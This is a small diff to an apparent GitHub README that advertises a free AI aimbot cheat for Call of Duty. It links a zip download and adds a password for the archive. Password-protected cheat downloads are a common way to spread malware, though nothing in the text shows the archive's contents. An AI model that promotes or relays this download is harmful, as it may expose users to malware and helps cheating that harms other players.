@@ -3,6 +3,8 @@ Free to use
 
 Download - https://github.com/Lua-Upgraded/Call-Of-Duty-AI-Aim/releases/download/Call-Of-Duty/AI.Launcher.zip
 
+**Password**: Lua-Upgraded
+
 The AI has been trained with over 10,000 hours of training using the yolov8 model and 500,000+ photos
 
 ![image](https://github.com/user-attachments/assets/e7912d75-cb5d-4798-8ca6-02f01c18350a)
